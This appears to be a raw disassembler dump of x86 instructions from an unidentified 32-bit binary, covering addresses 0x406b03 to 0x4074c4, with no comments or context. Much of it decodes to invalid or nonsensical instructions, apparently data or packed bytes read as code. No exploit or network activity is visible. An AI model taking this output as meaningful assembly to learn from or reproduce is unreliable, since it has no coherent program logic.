  406b03:	add    ch,cl
  406b05:	add    ecx,DWORD PTR ds:0xd03eb00
  406b0b:	add    cl,cl
  406b0d:	(bad)
  406b10:	lods   al,BYTE PTR ds:[esi]
  406b11:	add    ecx,DWORD PTR ds:0xd03e800
  406b17:	add    bh,ah
  406b19:	add    ecx,DWORD PTR ds:0xb2f91900
  406b1f:	jae    0x406b05
  406b21:	add    ecx,DWORD PTR ds:0xa2f91900
  406b27:	jae    0x406b0a
  406b29:	test   DWORD PTR [edi+0x0],0x4d81e9
  406b30:	lock add ecx,DWORD PTR ds:0xd03e800
  406b37:	add    BYTE PTR [ecx-0x1100327f],bh
  406b3d:	add    ecx,DWORD PTR ds:0xd041100
  406b43:	add    BYTE PTR [ecx-0x500327f],ah
  406b49:	add    ecx,DWORD PTR ds:0x3e100
	...
  406b6b:	add    BYTE PTR ds:0xcd814500,cl
  406b71:	(bad)  
  406b72:	fadd   DWORD PTR [ebx]
  406b74:	or     eax,0xd03d100
  406b79:	add    BYTE PTR [ecx-0x7f],bh
  406b7c:	int    0xff
  406b7e:	out    dx,eax
  406b7f:	add    ecx,DWORD PTR ds:0xd03f100
  406b85:	add    ch,dl
  406b87:	or     ch,0xff
  406b8a:	repz add ecx,DWORD PTR ds:0xd03e500
  406b91:	add    BYTE PTR [eax],al
  406b93:	mov    al,0xe
  406b95:	add    BYTE PTR [eax],al
  406b97:	aaa    
  406b98:	jmp    0x406b5a
  406b9a:	jmp    DWORD PTR [edx+0x1e00000e]
  406ba0:	sti    
  406ba1:	sar    bh,0x91
  406ba4:	push   cs
  406ba5:	add    BYTE PTR [eax],al
  406ba7:	push   cs
  406ba8:	jmp    0x406b6a
  406baa:	inc    DWORD PTR [esi+ecx*1-0x39a20000]
  406bb1:	sar    bh,0x73
  406bb4:	push   cs
  406bb5:	add    BYTE PTR [eax],al
  406bb7:	das    
  406bb8:	mov    dh,0xc0
  406bba:	jmp    DWORD PTR [esi+0x9]
  406bbd:	add    BYTE PTR [eax],al
  406bbf:	mov    esp,0x55ffc0a7
  406bc4:	or     DWORD PTR [eax],eax
  406bc6:	add    BYTE PTR [edi+0x68ffc097],bh
  406bcc:	push   cs
  406bcd:	add    BYTE PTR [eax],al
  406bcf:	icebp  
	...
  406bec:	add    BYTE PTR [eax],al
  406bee:	jnp    0x406bb0
  406bf0:	jmp    DWORD PTR [edi+0xe]
  406bf3:	add    BYTE PTR [eax],al
  406bf5:	aaa    
  406bf6:	push   0xffffffc0
  406bf8:	jmp    FWORD PTR [edx+0xe]
  406bfb:	add    BYTE PTR [eax],al
  406bfd:	sar    BYTE PTR [edx-0x40],cl
  406c00:	jmp    FWORD PTR [ecx+0xe]
  406c03:	add    BYTE PTR [eax],al
  406c05:	aad    0x6a
  406c07:	sar    bh,0x6c
  406c0a:	push   cs
  406c0b:	add    BYTE PTR [eax],al
  406c0d:	jle    0x406c56
  406c0f:	sar    bh,0x6b
  406c12:	push   cs
  406c13:	add    BYTE PTR [eax],al
  406c15:	pop    ss
  406c16:	sub    al,al
  406c18:	jmp    FWORD PTR [esi+0xe]
  406c1b:	add    BYTE PTR [eax],al
  406c1d:	leave  
  406c1e:	cmp    eax,eax
  406c20:	jmp    FWORD PTR [ebp+0xe]
  406c23:	add    BYTE PTR [eax],al
  406c25:	fisubr DWORD PTR [ecx]
  406c27:	sar    bh,0xff
  406c2a:	pushf  
  406c2b:	(bad)  
  406c2c:	(bad)  
  406c2d:	dec    edi
  406c2f:	fs inc ecx
  406c31:	add    BYTE PTR [ebp-0x3],ch
  406c34:	(bad)  
  406c35:	call   FWORD PTR [ecx]
  406c37:	fs inc ecx
  406c39:	add    BYTE PTR [esi-0x3],bh
  406c3c:	(bad)  
  406c3d:	jmp    FWORD PTR [edx]
  406c3f:	fs inc ecx
  406c41:	add    BYTE PTR [edi-0x3],ch
  406c44:	(bad)  
  406c45:	(bad)  
  406c46:	(bad)  [ebp+0x41]
  406c49:	add    BYTE PTR [eax-0x3],bl
  406c4c:	(bad)  
  406c4d:	call   DWORD PTR [edx+0x63]
  406c50:	inc    ecx
	...
  406c6d:	add    BYTE PTR [eax],al
  406c6f:	add    BYTE PTR [ecx],ch
  406c71:	std    
  406c72:	(bad)  
  406c73:	inc    DWORD PTR [esi]
  406c75:	arpl   WORD PTR [ecx+0x0],ax
  406c78:	cmp    bh,ah
  406c7a:	(bad)  
  406c7b:	(bad)  
  406c7c:	fsub   DWORD PTR [edx+0x41]
  406c7f:	add    BYTE PTR [ebp-0x79fefc03],dl
  406c85:	std    
  406c86:	xlat   BYTE PTR ds:[ebx]
  406c87:	add    al,BYTE PTR [edi-0x6efebf03]
  406c8d:	std    
  406c8e:	cmp    al,0x1
  406c90:	xchg   edx,eax
  406c91:	std    
  406c92:	pop    ecx
  406c93:	add    DWORD PTR [ebp-0x21fea003],ecx
  406c99:	cld    
  406c9a:	pop    ebp
  406c9b:	add    DWORD PTR [edi-0x37fe9c04],edi
  406ca1:	cld    
  406ca2:	js     0x406ca5
  406ca4:	sbb    bh,ch
  406ca6:	jl     0x406ca9
  406ca8:	mov    ebx,0x5017afc
  406cad:	std    
  406cae:	add    al,0x1
  406cb0:	push   es
  406cb1:	std    
  406cb2:	fiadd  DWORD PTR [edx]
  406cb4:	idiv   esp
  406cb6:	inc    ecx
  406cb7:	add    DWORD PTR [ecx-0x7dfec203],edx
  406cbd:	std    
  406cbe:	pop    edx
  406cbf:	add    DWORD PTR ds:0xfc70392,ecx
  406cc5:	nop
  406cc6:	add    esp,DWORD PTR [ecx+0xc]
  406cc9:	jge    0x406cce
  406ccb:	pop    edi
  406ccc:	or     al,0x7e
  406cce:	add    esp,DWORD PTR [ebp+0xc]
  406cd1:	jmp    0x406cd5
  406cd3:	jp     0x406cd5
	...
  406cf1:	add    BYTE PTR [esp+eiz*8],cl
  406cf4:	add    bl,ch
  406cf6:	psubusw mm0,QWORD PTR [edx]
  406cf9:	jle    0x406d07
  406cfb:	rol    BYTE PTR [edx],cl
  406cfd:	jl     0x406d0b
  406cff:	daa    
  406d00:	add    edx,DWORD PTR [esp+ecx*1+0x26]
  406d04:	add    eax,DWORD PTR [edx]
  406d06:	or     al,0x24
  406d08:	add    edi,DWORD PTR [ecx]
  406d0a:	or     al,0x19
  406d0c:	add    eax,DWORD PTR [esi]
  406d0e:	or     al,0x1f
  406d10:	add    ecx,DWORD PTR [esp+ecx*1]
  406d13:	sbb    eax,0xab0c1803
  406d18:	add    bl,BYTE PTR [edx]
  406d1a:	or     al,0xa2
  406d1c:	add    cl,BYTE PTR [esi]
  406d1e:	or     al,0xb7
  406d20:	add    dl,BYTE PTR [eax]
  406d22:	or     al,0xb8
  406d24:	add    al,BYTE PTR [ebx+0xc]
  406d27:	xchg   ebp,eax
  406d28:	add    al,BYTE PTR [edi+0xc]
  406d2b:	mov    WORD PTR [edx],es
  406d2d:	push   eax
  406d2e:	or     al,0x8f
  406d30:	add    bl,BYTE PTR [eax+0xc]
  406d33:	nop
  406d34:	add    ch,BYTE PTR [esi+0xc]
  406d37:	add    dh,BYTE PTR ds:[eax+0xc]
  406d3b:	mov    cl,0x2
  406d3d:	bound  ecx,QWORD PTR [edi+eax*4]
  406d40:	add    dl,BYTE PTR [ebp+0xc]
  406d43:	xchg   BYTE PTR [edx],al
  406d45:	add    ecx,DWORD PTR [esp+eax*4]
  406d48:	add    bh,BYTE PTR [edx]
  406d4a:	or     al,0x79
  406d4c:	add    al,BYTE PTR [edi]
  406d4e:	or     al,0x7f
  406d50:	add    cl,BYTE PTR ds:0x19027d0c
	...
  406d72:	add    BYTE PTR [eax],al
  406d74:	or     al,0x0
  406d76:	push   ebp
  406d77:	add    al,BYTE PTR [esi]
  406d79:	dec    DWORD PTR [ebp+0x2]
  406d7c:	adc    bh,bh
  406d7e:	pop    eax
  406d7f:	add    bh,ah
  406d81:	(bad)  
  406d82:	push   edi
  406d83:	add    cl,cl
  406d85:	(bad)  
  406d86:	cmp    al,BYTE PTR [edx]
  406d88:	push   ebp
  406d89:	add    DWORD PTR [edx+eax*1],esi
  406d8c:	pop    esp
  406d8d:	add    DWORD PTR [ecx],esi
  406d8f:	add    dl,BYTE PTR [ecx+eax*1+0x30]
  406d93:	add    ah,BYTE PTR [edx+0x1]
  406d96:	and    al,BYTE PTR [edx]
  406d98:	pop    esp
  406d99:	add    DWORD PTR [edi],ebx
  406d9b:	add    ch,BYTE PTR [esi+0x1]
  406d9e:	push   ss
  406d9f:	add    dh,BYTE PTR [edx+eax*1+0x12b0548]
  406da6:	dec    edi
  406da7:	add    eax,0x55000f1
  406dac:	std    
  406dad:	add    BYTE PTR [edx+0x5],al
  406db0:	sbb    eax,DWORD PTR [ecx]
  406db2:	cmp    eax,0x9800f905
  406db7:	add    dh,dl
  406db9:	add    BYTE PTR [edi-0x6fff17fe],dl
  406dbf:	add    bl,ah
  406dc1:	add    BYTE PTR [edx-0x7aff0dfe],dl
  406dc7:	add    al,BYTE PTR [eax+0x1]
  406dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dcb:	add    dl,BYTE PTR [edi]
  406dcd:	add    DWORD PTR [edi-0x6bfefafe],ebp
  406dd3:	add    ch,BYTE PTR ds:0x2c101
	...
  406df5:	add    BYTE PTR [ecx],cl
  406df7:	add    DWORD PTR [edx+eax*1+0x2b700f1],edi
  406dfe:	mov    ecx,0x6028400
  406e03:	add    DWORD PTR [edi+0x74011402],ecx
  406e09:	add    ch,ah
  406e0b:	add    BYTE PTR [eax],al
  406e0d:	jno    0x406e1e
  406e0f:	or     eax,0xdd0f6c01
  406e14:	add    BYTE PTR [edi+0xf],ah
  406e17:	int    0x0
  406e19:	mov    ecx,DWORD PTR [esi]
  406e1b:	sub    BYTE PTR [ecx],al
  406e1d:	mov    cl,BYTE PTR [esi]
  406e1f:	(bad)  
  406e20:	add    BYTE PTR [esi+ecx*1+0xe8f0118],al
  406e27:	sub    eax,DWORD PTR [ecx]
  406e29:	xchg   ebx,eax
  406e2a:	push   cs
  406e2b:	adc    al,BYTE PTR [ecx]
  406e2d:	or     BYTE PTR [esi],0x22
  406e30:	add    DWORD PTR [ebp+0xe],edi
  406e33:	out    0x0,al
  406e35:	pop    edx
  406e36:	push   cs
  406e37:	xlat   BYTE PTR ds:[ebx]
  406e38:	add    BYTE PTR [esi+ecx*1+0x19],dl
  406e3c:	add    DWORD PTR [edi+0xe],ebx
  406e3f:	sub    al,0x1
  406e41:	push   ebx
  406e42:	push   cs
  406e43:	adc    eax,DWORD PTR [ecx]
  406e45:	inc    edx
  406e46:	push   cs
  406e47:	and    eax,DWORD PTR [ecx]
  406e49:	cmp    eax,0x3400e70e
  406e4e:	push   cs
  406e4f:	mov    edx,0xbb0e2e00
  406e54:	add    BYTE PTR [ecx-0x59fefff1],ch
	...
  406e76:	add    BYTE PTR [eax],al
  406e78:	nop    DWORD PTR [ecx]
  406e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7c:	movhps xmm0,QWORD PTR [ecx]
  406e7f:	sahf   
  406e80:	bndldx bnd0,[ecx]
  406e83:	cwde   
  406e84:	pextrw eax,(bad),0xc5
  406e86:	add    BYTE PTR [ebx-0x65ff43f1],bl
  406e8c:	(bad)  
  406e8e:	add    DWORD PTR [eax-0x3bff0df1],edx
  406e94:	psubusb mm0,QWORD PTR [eax]
  406e97:	mov    edi,0x8900da0f
  406e9c:	sgdtd  [ecx]
  406e9f:	xchg   BYTE PTR [edi],cl
  406ea1:	pop    ds
  406ea2:	add    DWORD PTR [eax],eax
  406ea4:	mov    al,ds:0x93011701
  406ea9:	add    DWORD PTR [ebx],ebp
  406eab:	add    DWORD PTR [ebp-0x49feb9ff],esi
  406eb1:	add    DWORD PTR [ebp+0x1],ecx
  406eb4:	mov    DWORD PTR [ecx],0x1ad0137
  406eba:	jae    0x406ebd
  406ebc:	rol    DWORD PTR [ecx],0x69
  406ebf:	add    edx,eax
  406ec1:	add    DWORD PTR [ebx+0x1],ebp
  406ec4:	rol    BYTE PTR ds:0x595203e,cl
  406eca:	add    dh,BYTE PTR [eax]
  406ecc:	xchg   BYTE PTR ds:0x587300c,al
  406ed2:	or     eax,0x1055830
  406ed7:	xor    BYTE PTR [ecx+0x5],cl
  406eda:	sti    
  406edb:	xor    BYTE PTR [eax],al
	...
  406ef9:	add    BYTE PTR [edx+0x5],cl
  406efc:	repnz xor BYTE PTR [ebx+0x5],cl
  406f00:	mov    eax,ds:0xa3055c30
  406f05:	xor    BYTE PTR [ebp+0x5],bl
  406f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f09:	xor    BYTE PTR [esi+0x5],cl
  406f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0d:	xor    BYTE PTR [edi+0x5],cl
  406f10:	test   eax,0xe2f88030
  406f15:	xor    BYTE PTR [ecx-0x6dcf1b08],dl
  406f1b:	clc    
  406f1c:	out    0x30,al
  406f1e:	adc    edi,eax
  406f20:	ret    0x430
  406f23:	clc    
  406f24:	sti    
  406f25:	xor    BYTE PTR ds:0xf630a1f8,al
  406f2b:	mul    DWORD PTR [ebx-0x5a0808d0]
  406f31:	xor    al,cl
  406f33:	mul    DWORD PTR [edi-0x560846d0]
  406f39:	xor    BYTE PTR ds:0x1dab07cd,cl
  406f3f:	(bad)  
  406f40:	pop    es
  406f41:	lods   eax,DWORD PTR ds:[esi]
  406f42:	std    
  406f43:	mov    esi,0xbffdaf07
  406f48:	pop    es
  406f49:	mov    cl,0xfd
  406f4b:	xor    BYTE PTR [eax],cl
  406f4d:	mov    bl,0xfd
  406f4f:	xor    DWORD PTR [eax],ecx
  406f51:	mov    ch,0xdd
  406f53:	mov    ds:0x8bddb708,al
  406f58:	or     BYTE PTR [ecx-0x44f76b23],bh
	...
  406f7a:	add    BYTE PTR [eax],al
  406f7c:	fnstsw WORD PTR [ebp+0x8]
  406f7f:	mov    ebp,0xbf08173d
  406f84:	cmp    eax,0x3dc10818
  406f89:	sbb    DWORD PTR [eax],ecx
  406f8b:	les    edi,FWORD PTR ds:0x1dc6081a
  406f91:	sbb    ecx,DWORD PTR [eax]
  406f93:	enter  0x241d,0x8
  406f97:	retf   0x1d1d
  406f9a:	or     bl,cl
  406f9c:	sbb    eax,0xfdcc0826
  406fa1:	cs or  ch,cl
  406fa4:	std    
  406fa5:	das    
  406fa6:	or     dh,cl
  406fa8:	std    
  406fa9:	and    BYTE PTR [eax],cl
  406fab:	iret   
  406fac:	std    
  406fad:	and    DWORD PTR [eax],ecx
  406faf:	rcr    ch,cl
  406fb1:	mov    dl,0x7
  406fb3:	aad    0xdd
  406fb5:	fwait
  406fb6:	pop    es
  406fb7:	fcomp  st(5)
  406fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fba:	pop    es
  406fbb:	fcmovnu st,st(5)
  406fbd:	lea    eax,[edi]
  406fbf:	fidivr WORD PTR ds:0x3ddf0787
  406fc5:	mov    BYTE PTR [edi],al
  406fc7:	loopne 0x407006
  406fc9:	mov    DWORD PTR [edi],eax
  406fcb:	loope  0x40700a
  406fcd:	mov    al,BYTE PTR [edi]
  406fcf:	loop   0x406fee
  406fd1:	add    BYTE PTR [ebp-0x4bd096f9],bh
  406fd7:	pop    es
  406fd8:	jae    0x407009
  406fda:	mov    edi,0xb62f6507
  406fdf:	pop    es
	...
  406ffc:	add    BYTE PTR [eax],al
  406ffe:	xor    al,0x2f
  407000:	mov    eax,ds:0xa02f3707
  407005:	pop    es
  407006:	es das 
  407008:	xchg   ebx,eax
  407009:	pop    es
  40700a:	and    DWORD PTR [edi],ebp
  40700c:	xchg   edx,eax
  40700d:	pop    es
  40700e:	cmp    BYTE PTR [edi],ch
  407010:	inc    ebp
  407011:	pop    es
  407012:	xor    ch,BYTE PTR [edi]
  407014:	cmp    al,0x7
  407016:	push   ds
  407017:	das    
  407018:	aaa    
  407019:	pop    es
  40701a:	jbe    0x40704b
  40701c:	cs pop es
  40701e:	test   eax,0x11069530
  407023:	add    al,BYTE PTR [edx+0x76021606]
  407029:	push   es
  40702a:	adc    al,BYTE PTR [edx]
  40702c:	sub    BYTE PTR [esi],al
  40702e:	sub    al,0x2
  407030:	sub    eax,DWORD PTR [esi]
  407032:	das    
  407033:	add    ch,BYTE PTR [edx]
  407035:	push   es
  407036:	add    ch,BYTE PTR cs:0x24022906
  40703d:	push   es
  40703e:	lock add DWORD PTR [edi],ebp
  407041:	push   es
  407042:	jmp    0x407045
  407044:	es push es
  407046:	repnz add DWORD PTR [ecx],esp
  407049:	push   es
  40704a:	in     eax,0x1
  40704c:	and    BYTE PTR [esi],al
  40704e:	hlt    
  40704f:	add    DWORD PTR [ebx-0x4dfe08ff],esi
  407055:	add    esi,esp
  407057:	add    DWORD PTR [ebp-0x63fe1eff],esp
  40705d:	add    DWORD PTR [eax],edi
  40705f:	add    dh,BYTE PTR [edi+0x1]
	...
  40707d:	add    BYTE PTR [eax],al
  40707f:	add    BYTE PTR [ebx],dh
  407081:	add    ch,BYTE PTR [esi+0x22a01]
  407087:	cdq    
  407088:	or     al,0x30
  40708a:	push   es
  40708b:	cwde   
  40708c:	or     al,0x31
  40708e:	push   es
  40708f:	mov    ebx,0xba062e0c
  407094:	or     al,0x2f
  407096:	push   es
  407097:	mov    ebp,0xb406340c
  40709c:	or     al,0x35
  40709e:	push   es
  40709f:	lahf   
  4070a0:	or     al,0x32
  4070a2:	push   es
  4070a3:	xchg   esi,eax
  4070a4:	or     al,0x33
  4070a6:	push   es
  4070a7:	xchg   ecx,eax
  4070a8:	or     al,0x28
  4070aa:	push   es
  4070ab:	nop
  4070ac:	or     al,0x29
  4070ae:	push   es
  4070af:	inc    ebx
  4070b0:	or     al,0x26
  4070b2:	push   es
  4070b3:	dec    ecx
  4070b4:	or     al,0xc0
  4070b6:	add    eax,0x5c10c48
  4070bb:	dec    ebx
  4070bc:	or     al,0xbe
  4070be:	add    eax,0x5bf0c4a
  4070c3:	inc    ebp
  4070c4:	or     al,0xc4
  4070c6:	add    eax,0x5c50c4c
  4070cb:	inc    edi
  4070cc:	or     al,0xc2
  4070ce:	add    eax,0x5c30c0e
  4070d3:	adc    DWORD PTR [eax+edi*4],ecx
  4070d6:	add    eax,0x5b90c00
  4070db:	add    ecx,DWORD PTR [esi+esi*4]
  4070de:	add    eax,0x5b70c12
  4070e3:	or     eax,0x0
	...
  407100:	add    BYTE PTR [eax],al
  407102:	or     al,0xbc
  407104:	add    eax,0x5bd0c04
  407109:	dec    DWORD PTR ds:0xdd605ba
  40710f:	mov    ebx,0xd00dd905
  407114:	add    eax,0x5d10dd8
  407119:	fisttp DWORD PTR ds:0x950005ce
  40711f:	add    BYTE PTR [edx+0x4],dl
  407122:	xchg   BYTE PTR [eax],al
  407124:	push   ebx
  407125:	add    al,0x87
  407127:	add    BYTE PTR [ecx+0x4],dl
  40712a:	nop
  40712b:	add    BYTE PTR [esp+eax*1-0x2f],dl
  40712f:	add    BYTE PTR [ebp+0x4],dl
  407132:	rol    BYTE PTR [eax],cl
  407134:	push   esi
  407135:	add    al,0xc3
  407137:	add    BYTE PTR [edi+0x4],dl
  40713a:	int3   
  40713b:	add    BYTE PTR [eax+0x4],bl
  40713e:	fld    QWORD PTR [eax]
  407140:	pop    ecx
  407141:	add    al,0xde
  407143:	add    BYTE PTR [edx+0x4],bl
  407146:	iret   
  407147:	add    BYTE PTR [ebx+0x4],bl
  40714a:	call   0x7944cd4f
  40714f:	add    BYTE PTR [ecx+0x5e008a04],dl
  407155:	add    al,0x8b
  407157:	add    BYTE PTR [edi+0x4],bl
  40715a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715b:	call   DWORD PTR ds:0x1ff8521
  407161:	add    al,0x76
  407163:	inc    DWORD PTR [edx]
  407165:	add    al,0x0
	...
  407183:	add    BYTE PTR [edi-0x1],dh
  407186:	add    BYTE PTR [eax+eiz*2],al
  407189:	inc    DWORD PTR [ebx]
  40718b:	add    al,0x41
  40718d:	inc    DWORD PTR [esp+eax*1]
  407190:	inc    edx
  407191:	inc    DWORD PTR ds:0x6ff3304
  407197:	add    al,0x5c
  407199:	inc    DWORD PTR [edi]
  40719b:	add    al,0x4d
  40719d:	dec    DWORD PTR [eax]
  40719f:	add    al,0x4e
  4071a1:	dec    DWORD PTR [ecx]
  4071a3:	add    al,0xff
  4071a5:	dec    BYTE PTR [edx]
  4071a7:	add    al,0xf8
  4071a9:	dec    BYTE PTR [ebx]
  4071ab:	add    al,0x69
  4071ad:	dec    BYTE PTR [edi+0xdfe7a04]
  4071b3:	add    al,0xd
  4071b5:	xchg   edx,eax
  4071b6:	add    cl,BYTE PTR [edi]
  4071b8:	adc    DWORD PTR [edi-0x67f6b1fe],edx
  4071be:	add    dh,BYTE PTR [eax]
  4071c0:	adc    DWORD PTR [ebp-0x69f6cefe],edx
  4071c6:	add    al,BYTE PTR [esi+0x11]
  4071c9:	mov    ds:0x9c093402,eax
  4071ce:	add    dh,BYTE PTR ds:0x4402a111
  4071d4:	or     DWORD PTR [edx-0x60eeccfe],ebx
  4071da:	add    al,BYTE PTR [ebp+0x9]
  4071dd:	mov    al,0x2
  4071df:	cmp    BYTE PTR [ecx],dl
  4071e1:	lods   eax,DWORD PTR ds:[esi]
  4071e2:	add    bh,BYTE PTR [ecx]
  4071e4:	or     DWORD PTR [esi+0x3a02],ebx
	...
  407206:	adc    DWORD PTR [ebx+0x34093b02],ecx
  40720c:	add    bh,BYTE PTR [ecx+edx*1]
  40720f:	sbb    DWORD PTR [edx],eax
  407211:	cmp    eax,0x3e022209
  407216:	adc    DWORD PTR [edi],esp
  407218:	add    bh,BYTE PTR [edi]
  40721a:	or     DWORD PTR [eax],ecx
  40721c:	add    cl,BYTE PTR [edi+0x11]
  40721f:	add    eax,0x6094002
  407224:	add    al,BYTE PTR [ecx+0x11]
  407227:	adc    eax,DWORD PTR [edx]
  407229:	inc    edx
  40722a:	or     DWORD PTR [edx+eax*1],ebp
  40722d:	inc    ebx
  40722e:	adc    DWORD PTR [ecx],esi
  407230:	add    dh,BYTE PTR [esi]
  407232:	or     DWORD PTR [edx],ebp
  407234:	add    dh,BYTE PTR [edx]
  407236:	adc    DWORD PTR [edi],ebp
  407238:	add    cl,BYTE PTR [ecx+ecx*1+0x20]
  40723c:	add    cl,BYTE PTR [ebx+0x11]
  40723f:	sbb    eax,0xe093702
  407244:	add    cl,BYTE PTR [eax+0x11]
  407247:	sti    
  407248:	add    DWORD PTR [ebp+0x9],ecx
  40724b:	add    ah,al
  40724d:	add    DWORD PTR [esp+eax*1-0x41],eax
  407251:	add    DWORD PTR [edx+0x4],ecx
  407254:	mov    dh,0x1
  407256:	xlat   BYTE PTR ds:[ebx]
  407257:	add    ecx,ecx
  407259:	add    DWORD PTR [ebx],esi
  40725b:	add    al,0xc8
  40725d:	add    DWORD PTR ds:0x1c01cb04,ebx
  407263:	add    al,0xca
  407265:	add    DWORD PTR [ebx],esi
  407267:	add    al,0xc5
  407269:	add    DWORD PTR [eax],eax
	...
  407287:	add    cl,bh
  407289:	add    ecx,DWORD PTR [ecx+eax*1+0x1870400]
  407290:	sub    DWORD PTR [esi+ecx*4],eax
  407293:	add    DWORD PTR [esi],ebx
  407295:	add    al,0x81
  407297:	add    eax,ebp
  407299:	add    edx,DWORD PTR [eax-0x6cfbeaff]
  40729f:	add    DWORD PTR [esp+eax*1],edx
  4072a2:	add    BYTE PTR [ecx],0x7
  4072a5:	add    al,0x7d
  4072a7:	add    DWORD PTR [esi],eax
  4072a9:	add    al,0x54
  4072ab:	add    ecx,edi
  4072ad:	add    ecx,DWORD PTR [edi+0x1]
  4072b0:	lock add eax,DWORD PTR [esi+0x1]
  4072b4:	sub    edi,esp
  4072b6:	pop    eax
  4072b7:	add    DWORD PTR [edx],esp
  4072b9:	cld    
  4072ba:	aaa    
  4072bb:	add    DWORD PTR [edx],ebp
  4072bd:	cld    
  4072be:	cmp    al,BYTE PTR [ecx]
  4072c0:	sub    eax,0x2c0139fc
  4072c5:	cld    
  4072c6:	xor    al,0x1
  4072c8:	das    
  4072c9:	cld    
  4072ca:	sbb    eax,DWORD PTR [ecx]
  4072cc:	cs cld 
  4072ce:	push   ss
  4072cf:	add    ebx,edi
  4072d1:	sti    
  4072d2:	sbb    eax,0x10fc1f01
  4072d7:	add    ecx,esi
  4072d9:	sti    
  4072da:	inc    DWORD PTR [eax]
  4072dc:	out    0xfb,al
  4072de:	add    al,BYTE PTR [ecx]
  4072e0:	sbb    bh,ah
  4072e2:	push   ecx
  4072e4:	or     eax,0xded0418
  4072e9:	adc    eax,0xe404
	...
  40730a:	fwait
  40730b:	sbb    BYTE PTR [edi+ebx*8],al
  40730e:	xchg   ebx,eax
  40730f:	push   ds
  407310:	add    al,0xd6
  407312:	mov    ebx,DWORD PTR [ecx]
  407314:	add    al,0x88
  407316:	cmp    BYTE PTR [ebp+0x3],0x8b
  40731a:	jp     0x40739b
  40731c:	add    ecx,DWORD PTR [edx-0x72fc878e]
  407322:	push   0x79
  407324:	add    eax,DWORD PTR [edx+eiz*2+0x5a4e0399]
  40732b:	jnp    0x407330
  40732d:	push   ecx
  40732e:	push   edx
  40732f:	jne    0x407334
  407331:	inc    eax
  407332:	dec    edx
  407333:	call   0x5703:0x76424203
  40733a:	cmp    bh,BYTE PTR [ebx+eax*1+0x4e]
  40733e:	xor    cl,BYTE PTR [eax+eiz*1]
  407341:	cmp    BYTE PTR [edx],ch
  407343:	fwait
  407344:	add    edi,DWORD PTR [ebx]
  407346:	and    dl,BYTE PTR [ebx+eax*1+0x3951a9a]
  40734d:	xchg   ebp,eax
  40734e:	adc    dl,BYTE PTR [esi+0x390a9c03]
  407354:	add    edx,DWORD PTR [edi+0x7e037702]
  40735a:	cli    
  40735b:	cmp    al,BYTE PTR [ebx]
  40735d:	xor    edx,0xea700333
  407363:	cmp    DWORD PTR [ebx],eax
  407365:	jae    0x407349
  407367:	xchg   esi,eax
  407368:	add    esp,DWORD PTR [edx-0x26]
  40736b:	xor    al,0x3
  40736d:	sub    BYTE PTR [eax],al
	...
  40738b:	add    dl,dl
  40738d:	pop    DWORD PTR [ebx]
  40738f:	sub    ecx,edx
  407391:	nop
  407392:	add    ebp,DWORD PTR [edx]
  407394:	ret    0x391
  407397:	add    al,ch
  407399:	xchg   bx,ax
  40739b:	add    ebp,ecx
  40739d:	xchg   sp,ax
  40739f:	add    edi,edx
  4073a1:	xchg   bp,ax
  4073a3:	add    ebp,ebx
  4073a5:	xchg   si,ax
  4073a7:	add    ebx,DWORD PTR [ebp+eiz*2-0x69]
  4073ab:	add    ebx,DWORD PTR [ebp+0x65]
  4073ae:	cwde   
  4073af:	add    ebp,DWORD PTR [esi-0x50fc669b]
  4073b5:	gs call 0xa103:0x9b65c003
  4073bd:	gs pushf 
  4073bf:	add    esi,DWORD PTR [edx-0x7cfc629b]
  4073c5:	gs sahf 
  4073c7:	add    edx,DWORD PTR [ebp+eiz*2+0x6595039f]
  4073ce:	mov    al,ds:0xa2658603
  4073d3:	add    edi,DWORD PTR [eax+0x65]
  4073d6:	mov    ds:0xa4659903,eax
  4073db:	add    ebx,DWORD PTR [edx-0x74fc5a9b]
  4073e1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4073e3:	add    edi,DWORD PTR [ebp+eiz*2-0x59]
  4073e7:	add    ecx,ebp
  4073e9:	gs test al,0x3
  4073ec:	lds    esp,FWORD PTR [ebp-0x50]
  4073ef:	add    eax,DWORD PTR [eax]
	...
  40740d:	add    BYTE PTR [esi+0x66],dl
  407410:	mov    cl,0x3
  407412:	push   edi
  407413:	data16 mov dl,0x3
  407416:	dec    eax
  407417:	data16 mov bl,0x3
  40741a:	dec    ecx
  40741b:	data16 mov ah,0x3
  40741e:	pop    edx
  40741f:	data16 mov ch,0x3
  407422:	dec    ebx
  407423:	data16 mov dh,0x3
  407426:	cld    
  407427:	gs mov bh,0x3
  40742a:	std    
  40742b:	gs mov eax,0xfe010d03
  407431:	mov    ecx,0xbafe020e
  407436:	push   cs
  407437:	or     edi,esi
  407439:	mov    ebx,0xbcfdf40e
  40743e:	push   cs
  40743f:	std    
  407440:	std    
  407441:	mov    ebp,0xbefd660e
  407446:	push   cs
  407447:	inc    edi
  407448:	std    
  407449:	mov    edi,0xc0fd480e
  40744e:	push   cs
  40744f:	dec    ecx
  407450:	std    
  407451:	ret    0x4a0e
  407454:	std    
  407455:	ror    DWORD PTR [esi],0xa3
  407458:	std    
  407459:	ret    
  40745a:	push   cs
  40745b:	lods   al,BYTE PTR ds:[esi]
  40745c:	std    
  40745d:	les    ecx,FWORD PTR [esi]
  40745f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407460:	std    
  407461:	lds    ecx,FWORD PTR [esi]
  407463:	scas   al,BYTE PTR es:[edi]
  407464:	std    
  407465:	(bad)  
  407466:	push   cs
  407467:	lahf   
  407468:	std    
  407469:	(bad)  
  40746a:	push   cs
  40746b:	mov    al,ds:0xb80ec8fd
  407470:	sti    
  407471:	mov    dh,0x0
	...
  40748f:	add    dh,ch
  407491:	mov    eax,0xb9f00bfb
  407496:	sti    
  407497:	(bad)  
  407498:	jmp    0xee607057
  40749d:	mov    bl,0xfb
  40749f:	and    dh,ch
  4074a1:	mov    esp,0x75f001fb
  4074a6:	cld    
  4074a7:	mov    al,ds:0xa2fc8eee
  4074ac:	cs cmp ah,0xa3
  4074b0:	cs cmp esp,0xfc922ea5
  4074b7:	call   0x7c2e:0x9cfc732e
  4074be:	cld    
  4074bf:	popf   
  4074c0:	cs in  eax,0xfb
  4074c3:	lahf   
  4074c4:	add    BYTE PTR cs:[esi-0x4],dl
